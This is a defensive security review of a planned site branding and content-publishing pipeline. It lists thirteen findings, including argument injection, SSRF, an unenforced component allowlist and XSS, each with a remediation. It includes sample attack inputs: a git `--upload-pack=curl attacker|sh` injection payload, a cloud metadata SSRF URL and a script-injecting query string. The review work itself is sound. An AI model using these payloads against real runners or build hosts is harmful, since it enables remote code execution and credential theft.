# Adversarial Security Review — add-brand-assets-and-writing-pipeline

Scope: SECURITY only. Verified against `scripts/csp.mjs`, `scripts/sri.mjs`, and `rules/security/*.yml`.

## Findings

### F1 — git `--branch <SHA>` invocation is INVALID for SHAs (High)

File: `tasks.md:45`, `design.md:86`, `specs/site-writing-pipeline/spec.md:5`.
`git clone --depth 1 --branch <REF>` only accepts branch or tag names; passing a 40-hex SHA fails with `Remote branch <sha> not found`. Webhook flow (design.md:99) sets `WRITING_REMOTE_REF=<MERGE_SHA>` — the clone will fail every dispatch.
Remediation: replace with `git clone --depth 1 --no-tags --filter=blob:none --no-checkout … && git -C .cache/content-repo fetch --depth 1 origin <SHA> && git -C .cache/content-repo checkout FETCH_HEAD`. Update spec text in all three files.

### F2 — `client_payload.ref` flows into `--branch` unvalidated; argument injection (High)

File: `specs/site-writing-pipeline/spec.md:38`, `tasks.md:60–61`.
Spec validates `sha` as 40-hex but only "validates" `ref` without a regex. If `ref` reaches a shell-expanded `git clone --branch "$REF"` call, payloads like `--upload-pack=curl attacker|sh` or `-c protocol.ext.allow=always` enable RCE on the runner (CVE-2017-1000117 family). Even with F1's fix, any unsanitized payload field is a vector.
Remediation: drop `ref` entirely (the SHA is sufficient), or constrain to `^refs/(heads|tags)/[A-Za-z0-9._/-]{1,200}$` AND pass via `--` or `git -c` boundary; never interpolate dispatch fields into shell.

### F3 — No verification that dispatch originated from `artagon/content` (High)

File: `proposal.md:64`, `design.md:91–103`, `specs/site-writing-pipeline/spec.md:36`.
`repository_dispatch` only authenticates the PAT holder, not the source repo. Anyone with a leaked or social-engineered PAT scoped to `artagon/artagon-site:dispatches` can fire `pull-request-merged` with any `sha`/`repo` they choose. Spec has no source-repo allowlist.
Remediation: add Requirement: workflow MUST hardcode `WRITING_REMOTE_REPO=artagon/content` (ignore any `client_payload.repo`); reject if `client_payload.sha` is not reachable via `git ls-remote https://github.com/artagon/content` before clone.

### F4 — Build-host SSRF via remote `cover` frontmatter (Medium)

File: `specs/site-content/spec.md:3–5`, proposal "Out of Scope" §"Image transformations on remote-sourced posts".
Schema gains `repo`/`path`/`commit` but does not constrain `cover`. Astro `<Image>` with an absolute URL fetches at build time; a malicious post can set `cover: https://169.254.169.254/...` to exfiltrate cloud metadata or probe internal hosts from the GitHub Actions runner. The redesign's `^\.\/assets\/` constraint applies only to satori OG, not post `cover`.
Remediation: extend Zod for remote posts to require `cover` matches `^(\.\/assets\/|posts\/assets\/)`; reject absolute URLs and parent-traversal.

### F5 — Astro MDX `components` config does NOT enforce an allowlist (Medium)

File: `design.md:109–111`, `specs/site-writing-pipeline/spec.md:69–76`.
Astro's `components` prop maps known names to implementations; unknown JSX names fall through and render as plain HTML elements (e.g., `<UntrustedThirdPartyWidget>` becomes a no-op custom element). The "fails build at parse time" claim is unverified and false in default MDX behavior.
Remediation: add a remark/rehype plugin (or pre-build AST walker) that rejects MDX JSX nodes whose name is not in `['StandardChip','StandardsRow','TrustChain','Diagram','Callout']`; cite the plugin path in the requirement.

### F6 — `repo` frontmatter format unbounded; phishing/open-link surface (Medium)

File: `specs/site-content/spec.md:3`, `specs/site-writing-pipeline/spec.md:55–62`.
"format `<owner>/<repo>`" matches `evil/repo`; "Edit on GitHub" then points users at attacker-controlled GitHub repos. Trust is amplified because URL is `github.com` (passes any user link-safety heuristic).
Remediation: change schema to `repo: z.enum(['artagon/content'])` (or read-only equal to `WRITING_REMOTE_REPO`); reject non-allowlisted owners.

### F7 — sharp + remote SVG → external-href fetch at build (Medium)

File: `specs/site-branding/spec.md:31`, tasks.md Phase 3.
PNG generators read from `brand-svgs.ts` (trusted), so direct risk is low; however no spec text forbids a future contributor adding `<image href="https://..."/>` to factory output, which sharp/librsvg will fetch. Combined with the gallery copy-button reading the same factory, an SVG with `<image>` fetched at build is an SSRF + supply-chain risk.
Remediation: add Requirement to `site-branding`: SVG factories MUST NOT contain `<image>`, `<use href="http">`, or external `xlink:href`; enforce via ast-grep rule on `src/data/brand-svgs.ts`.

### F8 — Inline-glyph ban scope gap: CSS `data:` URIs and Astro raw blocks (Medium)

File: `specs/site-branding/spec.md:5`, tasks.md:23.
Rule targets `<svg ... viewBox="0 0 24 24"` literals; misses (a) `background-image: url("data:image/svg+xml,<svg viewBox='0 0 24 24'…")` in `.css`, (b) different viewBox values (e.g., 0 0 32 32 for the wordmark), (c) `<Fragment is:raw>{glyphString}</Fragment>` with concatenated strings.
Remediation: broaden ast-grep rule with multiple patterns (CSS, .astro `is:raw`, .mdx); add a regex sweep for `data:image/svg\+xml` in committed sources; document scope in the rule's `note:`.

### F9 — `.cache/content-repo/` staleness leaks embargoed content into builds (Medium)

File: `proposal.md:65`, `design.md:78–86`, tasks.md:47.
Spec gitignores `.cache/` but does not require `rm -rf` before clone. A contributor who ran `fetch:content` against an embargoed PR branch retains those files locally; a subsequent local `astro build` (or accidental `git add -f`) ships them.
Remediation: `scripts/fetch-content.mjs` MUST `rm -rf .cache/content-repo` before clone; CI MUST start from a fresh runner (already true) but make this explicit; pre-commit hook blocks `git add` of `.cache/`.

### F10 — `CONTENT_DISPATCH_TOKEN` rotation/leakage policy missing (Medium)

File: `proposal.md:51` ("Out of Scope: webhook auth/secret rotation policy"), `design.md:103`.
Treating rotation as out-of-scope is unsafe: PAT compromise enables F3-class abuse indefinitely. Site repo owns the trust boundary; deferring to the dispatcher's repo is wrong.
Remediation: add Requirement to `site-writing-pipeline`: token MUST be a fine-grained PAT, ≤ 90-day expiry, rotation runbook in `docs/writing-pipeline.md`; on suspected leak, revoke + remove workflow within 1h.

### F11 — Webhook DoS / runaway redeploy (Low)

File: `specs/site-writing-pipeline/spec.md:36`, tasks.md:60.
No `concurrency:` group, no rate cap. A misconfigured content-repo bot merging 100 PRs queues 100 builds.
Remediation: add `concurrency: { group: content-redeploy, cancel-in-progress: true }` to the workflow; require it in the spec.

### F12 — `/brand` copy-button island CSP coverage (Low, advisory)

File: `specs/site-brand-gallery/spec.md:13–19`.
`scripts/csp.mjs:40–45` auto-hashes inline scripts; if Astro emits the island as an external `/_astro/*.js` it falls under `script-src 'self'` (covered) and `scripts/sri.mjs` adds integrity. No new CSP gap, but spec should mandate the island ships as either inline (auto-hashed) or external-from-`'self'` — not third-party.
Remediation: add Scenario: built `/brand` HTML contains no `script-src` references outside `'self'` or page-internal hashes.

### F13 — Clipboard payload XSS-when-pasted (Low)

File: `specs/site-brand-gallery/spec.md:12–19`.
If `brand-svgs.ts` factories ever interpolate user-controlled `color` from query string/hash, a crafted `?color="/><script>…` produces an XSS-laden SVG that fires when pasted into Slack/Notion/GitHub issues. Spec doesn't constrain factory inputs.
Remediation: Requirement that factory `color`/`size` args MUST be validated (`color`: `^#[0-9a-f]{3,8}$|^currentColor$`; `size`: positive integer ≤ 4096); `/brand` MUST NOT read query string or hash for factory inputs.

## Verdict

**APPROVE-WITH-CHANGES** — must-fix count: **6** (F1, F2, F3, F4, F5, F6).
F7–F13 are SHOULD-fix before archive; F1–F6 are merge-blockers.
